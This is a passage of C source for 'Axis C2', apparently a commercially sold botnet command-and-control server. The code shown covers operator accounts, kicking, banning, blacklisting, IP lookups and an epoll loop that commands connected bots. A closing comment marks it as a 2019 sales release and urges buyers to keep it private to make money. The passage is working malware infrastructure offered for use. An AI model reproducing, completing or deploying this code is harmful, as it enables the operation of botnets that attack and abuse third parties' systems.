                fprintf(uinfo, "%s %s %s %s %s %d %d\n", new_user, new_pass, new_type, new_expr, new_plan, new_secs, new_cldwn);
                fclose(uinfo);
                FILE *adinfo = fopen(""LFD"/Admin_Report.log", "a+");
                fprintf(adinfo, "[%s] Added User [%s]\n", MNGRS[axisfd].nick, new_user);
                fclose(adinfo);
                printf(""W"%s\x1b[37m Added User ["Y"%s\x1b[37m]\n", MNGRS[axisfd].nick, new_user);
                sprintf(axis, ""W"%s\x1b[37m Added User ["Y"%s\x1b[37m]\r\n", MNGRS[axisfd].nick, new_user);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                new_bc = 0;
            }
            else{
                sprintf(axis, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "deluser") || strstr(buf, "DELUSER")){
            if(MNGRS[axisfd].axadm == 1){
                int kdm;
                char deluser[50];
                if(send(axisfd, ""Y"Username: \x1b[37m", strlen(""Y"Username: \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                memset(deluser, 0, sizeof(deluser));
                while(fdgets(deluser, sizeof deluser, axisfd) < 1){
                    Trim(deluser);
                    if(strlen(deluser) < 3) continue;
                    break;
                }
                Trim(deluser);
                RMSTR(deluser, DB);
                sprintf(axis, ""R"["W"Deleted User "R"("W"%s"R")"W"..."R"]\r\n", deluser);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                for(kdm = 0; kdm < MXFDS; kdm++){
                    if(!MNGRS[kdm].connd) continue;
                    if(!strcmp(MNGRS[kdm].nick, deluser)){
                        close(kdm);
                        MNGRS[kdm].connd = 0;
                        memset(MNGRS[kdm].ip, 0, sizeof(MNGRS[kdm].ip));
                        memset(MNGRS[kdm].nick, 0, sizeof(MNGRS[kdm].nick));
                        memset(MNGRS[kdm].axexp, 0, sizeof(MNGRS[kdm].axexp));
                    }
                }
            }
            else{
                sprintf(axis, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "kick") || strstr(buf, "KICK")){
            if(MNGRS[axisfd].axadm == 1){
                if(strstr(buf, "user=") || strstr(buf, "USER=")){
                    int id;
                    char user[20];
                    char *token = strtok(buf, "=");
                    snprintf(user, sizeof(user), "%s", token+strlen(token)+1);
                    Trim(user);
                    for(id=0; id < MXFDS; id++){
                        if(strstr(MNGRS[id].nick, user)){
                            sprintf(axis, "\n\x1b[31mGoodbye, Kicked By "R"%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                            if(send(id, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                            MNGRS[id].connd = 0;
                            close(id);
                            sprintf(axis, ""R"["W"Kicked "R"("W"%s"R")"W"..."R"]\r\n", user);
                            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID=")){
                    char *token = strtok(buf, "=");
                    int uid = atoi(token+strlen(token)+1);
                    sprintf(axis, "\n\x1b[31mGoodbye, Kicked By "R"%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                    if(send(uid, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    MNGRS[uid].connd = 0;
                    close(uid);
                    sprintf(axis, ""R"["W"Kicked User with ID# "R"("W"%d"R")"W"..."R"]\r\n", uid);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
            }
            else{
                sprintf(axis, ""W"["R"Permission Denied!"W"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "ban") || strstr(buf, "BAN")){
            if(MNGRS[axisfd].axadm == 1){
                // ex1: . ban id=5
                // ex2: . ban ip=1.1.1.1
                // ex3: . ban user=tragedy
                if(strstr(buf, "user=") || strstr(buf, "USER=")){
                    int id;
                    int kx = 0;
                    char iusername[30];
                    char *token = strtok(buf, "=");
                    snprintf(iusername, sizeof(iusername), "%s", token+strlen(token)+1);
                    Trim(iusername);
                    for(kx = 0; kx < MXFDS; kx++){
                        if(!strcmp(MNGRS[kx].nick, iusername))
                            id = kx;
                    }
                    kx = 0;
                    banstart1:
                    if(atoi(CNSL[kx].banned) > 2){
                        kx++;
                        goto banstart1;
                    }
                    else{
                        snprintf(CNSL[kx].banned, sizeof(CNSL[kx].banned), "%s", MNGRS[id].ip);
                        sprintf(axis, "\n\x1b[31mGoodbye, Banned by "R"%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                        if(send(id, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        MNGRS[id].connd = 0;
                        close(id);
                        sprintf(axis, ""R"["W"Banned User "R"("W"%s"R")"W"..."R"]\r\n", iusername);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID=")){
                    int kx = 0;
                    char *token = strtok(buf, "=");
                    int uid = atoi(token+strlen(token)+1);
                    banstart:
                    if(atoi(CNSL[kx].banned) > 2){
                        kx++;
                        goto banstart;
                    }
                    else
                        snprintf(CNSL[kx].banned, sizeof(CNSL[kx].banned), "%s", MNGRS[uid].ip);
                    sprintf(axis, "\n\x1b[31mGoodbye, Banned by "R"%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                    if(send(uid, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    MNGRS[kx].connd = 0;
                    close(uid);
                    sprintf(axis, ""R"["W"Banned User with ID# "R"("W"%d"R")"W"..."R"]\r\n", uid);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
                else if(strstr(buf, "ip=") || strstr(buf, "IP=")){
                    int kx = 0;
                    char target[16];
                    char *token = strtok(buf, "=");
                    snprintf(target, sizeof(target), "%s", token+strlen(token)+1);
                    Trim(target);
                    banstart2:
                    if(atoi(CNSL[kx].banned) > 2){
                        kx++;
                        goto banstart2;
                    }
                    else
                        snprintf(CNSL[kx].banned, sizeof(CNSL[kx].banned), "%s", target);
                    for(kx = 0; kx < MXFDS; kx++){
                        if(!strcmp(MNGRS[kx].ip, target)){
                            sprintf(axis, "\n\x1b[31mGoodbye, Banned by "R"%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                            if(send(kx, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                            MNGRS[kx].connd = 0;
                            close(kx);
                            sprintf(axis, ""R"["W"Banned User with IP "R"("W"%d"R")"W"..."R"]\r\n", target);
                            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
            }
            else{
                sprintf(axis, "BAN - \x1b[31mPermission Denied, Admins Only!\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "unban") || strstr(buf, "UNBAN")){
            if(MNGRS[axisfd].axadm == 1){
                //Ex: unban ip=1.1.1.1
                if(strstr(buf, "ip=") || strstr(buf, "IP=")){
                    int kx = 0;
                    char target[16];
                    char *token = strtok(buf, "=");
                    snprintf(target, sizeof(target), "%s", token+strlen(token)+1);
                    Trim(target);
                    for(kx = 0; kx < MXFDS; kx++){
                        if(!strcmp(CNSL[kx].banned, target)){
                            memset(CNSL[kx].banned, 0, sizeof(CNSL[kx].banned));
                            sprintf(axis, ""R"["W"Unbanned User with IP "R"("W"%d"R")"W"..."R"]\r\n", target);
                            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
            }
            else{
                sprintf(axis, "UNBAN - \x1b[31mPermission Denied, Admins Only!\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "BLACKLIST") || strstr(buf, "blacklist")){
            if(MNGRS[axisfd].axadm == 1 ){
                int ret;
                char new_black[40];
                if(send(axisfd, ""Y"[Target]"W": \x1b[37m", strlen(""Y"[Target]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                while(ret = read(axisfd, new_black, sizeof(new_black))){
                    new_black[ret] = '\0';
                    Trim(new_black);
                    if(strlen(new_black) < 3) continue;
                    break;
                }
                Trim(new_black);
                FILE *blist = fopen(""LFD"/BLACK.lst", "a+");
                fprintf(blist, "%s\n", new_black);
                fclose(blist);
                FILE *adinfo = fopen(""LFD"/Admin_Report.log", "a+");
                fprintf(adinfo, "[%s] BlackListed -> [%s]\n", MNGRS[axisfd].nick, new_black);
                fclose(adinfo);
                printf(""W"%s\x1b[37m BlackListed ["Y"%s\x1b[37m]\n", MNGRS[axisfd].nick, new_black);
                sprintf(axis, ""R"["W"BlackListed "R"("W"%s"R")"W"..."R"]\r\n", new_black);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
            else{
                sprintf(axis, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "RMBLK") || strstr(buf, "rmblk")){
            if(MNGRS[axisfd].axadm == 1){
                char rmblack[50];
                if(send(axisfd, ""Y"[Target]"W": \x1b[37m", strlen(""Y"[Target]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                memset(rmblack, 0, sizeof(rmblack));
                while(fdgets(rmblack, sizeof rmblack, axisfd) < 1){
                    Trim(rmblack);
                    if(strlen(rmblack) < 3) continue;
                    break;
                }
                Trim(rmblack);
                RMSTR(rmblack, ""LFD"/BLACK.lst");
                printf(""W"%s\x1b[37m Un-BlackListed ["Y"%s\x1b[37m]\n", MNGRS[axisfd].nick, rmblack);
                sprintf(axis, ""R"["W"Un-BlackListed "R"("W"%s"R")"W"..."R"]\r\n", rmblack);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
            else{
                sprintf(axis, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE")){
            char *ip[100];
            char *token = strtok(buf, " ");
            char *url = token+sizeof(token);
            Trim(url);
            resolvehttp(url, ip);
            printf(""R"[\x1b[0mResolver"R"] %s -> %s\n", url, ip);
            sprintf(axis, ""R"[\x1b[0mResolver"R"] %s -> %s\r\n", url, ip);
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP ")){
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            Trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8){
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                timeout.tv_sec = 4; //4 Second Timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(api_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1){
                    sprintf(axis, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\r\n", myhost);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
                else{
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, api_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0)){
                        sprintf(axis, "\x1b[0m["R"IPLookup\x1b[0m] "R"Getting Info For -> %s...\r\n", myhost);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A){
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024)){
                            iplbuffer[ret] = '\0';
                        }
                        if(strstr(iplbuffer, "<title>404")){
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", api_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(axis, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(axis, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\r\n");
                        else sprintf(axis, ""R"[+]--- "W"Results"R" ---[+]\r\n"W"%s \r\n", iplbuffer);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    else{
                        sprintf(axis, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                }
                memset(iplbuffer, 0, sizeof(iplbuffer));
                close(IPLSock);
            }
        }
        else if (strstr(buf, "INFO") || strstr(buf, "info") || strstr(buf, "CREDS") || strstr(buf, "creds")){
            sprintf(axis, "\r\n            \x1b[0m| "R"%s \x1b[0m| "R"Version "W"%s \x1b[0m| "R"By "W"%s \x1b[0m|\r\n", cnc_n, cnc_ver, cpyrt_n);
            if(send(axisfd, axis, strlen(axis), 0) == -1) return;
        }
        Trim(buf);
        if(strlen(buf) == 0){
            snprintf(axisprompt, sizeof(axisprompt), ""R"%s"W"@"R"軸"W"~#"R": "W"", ACCS[fnd].axid);
            if(send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1) return;
            continue;
        }
        else{
            FILE *servlog = fopen(""LFD"/SERVER.log", "a+");
            fprintf(servlog, "[%s]: %s\n", MNGRS[axisfd].nick, buf);
            fclose(servlog);
            if(send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1) return;
            memset(buf, 0, sizeof(buf));
        }}
        end:
                if(MNGRS[axisfd].axadm == 1 && MNGRS[axisfd].connd){
                    Broadcast(buf, axisfd, usrnms, 4, MXFDS, axisfd);
                    printf(AXISN" "R"Admin("W"%s"R":"W"%s"R") Logged Out "AXISN"\n", MNGRS[axisfd].nick, management_ip);
                    UsersOnline --;
                }
                else if(MNGRS[axisfd].axadm == 0 && MNGRS[axisfd].connd){
                    Broadcast(buf, axisfd, usrnms, 2, MXFDS, axisfd);
                    printf(AXISN" "R"User("W"%s"R":"W"%s"R") Logged Out "AXISN"\n", MNGRS[axisfd].nick, management_ip);
                    UsersOnline --;
                }
                MNGRS[axisfd].connd = 0;
                memset(MNGRS[axisfd].nick, 0, sizeof(MNGRS[axisfd].nick));
                memset(MNGRS[axisfd].ip, 0, sizeof(MNGRS[axisfd].ip));
                memset(axis, 0, sizeof(axis));
                close(axisfd);
}
void *TEL_Lstn(int port){
    int sockfd, newsockfd;
    struct epoll_event event;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while (1){
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        
        struct TEL_LSTNArgs args;
        args.sock = newsockfd;
        args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

        pthread_t thread;
        pthread_create(&thread, NULL, &TelWorker, (void *)&args);
    }   
}
//[+]============================================================================================================================[+]
int main (int argc, char *argv[], void *sock){
    signal(SIGPIPE, SIG_IGN); //Ignore Broken Pipe Signals
    int s, threads, port;
    struct epoll_event event;
    if (argc != 3){
        fprintf (stderr, "Usage: %s [BOTPORT] [THREADS] \n", argv[0]);
        exit (EXIT_FAILURE);
    }
    printf("      ["R"Axis C2\x1b[0m]\n   \n");
    telFD = fopen(""LFD"/Tel.log", "a+");
    threads = atoi(argv[2]);
    listenFD = CreateAndBind (argv[1]); //Try To Create Listening Socket, Die If We Can't
    if (listenFD == -1) abort ();
    s = MakeSocket_NonBlocking (listenFD); //Try To Make It Non-Blocking, Die If We Can't
    if (s == -1) abort ();
    s = listen (listenFD, SOMAXCONN); //Listen With A Huuuuuuge Backlog
    if (s == -1){
        perror ("listen");
        abort ();
    }
    epollFD = epoll_create1 (0); //Make An Epoll Listener, Die If We Can't
    if (epollFD == -1){
        perror ("epoll_create");
        abort ();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1){
        perror ("epoll_ctl");
        abort ();
    }
    pthread_t thread[threads + 2];
    while(threads--){
        pthread_create( &thread[threads + 2], NULL, &EpollEventLoop, (void *) NULL); //Make A Thread To Command Each Bot Individually
    }
    pthread_create(&thread[0], NULL, &TEL_Lstn, port);
    while(1){
        Broadcast("PING", -1, "axis", 0, MXFDS, 0);
        sleep(60);
    }
    close (listenFD);
    return EXIT_SUCCESS;
}
/* 
    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
    Sales Release 10/5/2019
    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
    Much Love 
        - Tragedy
*/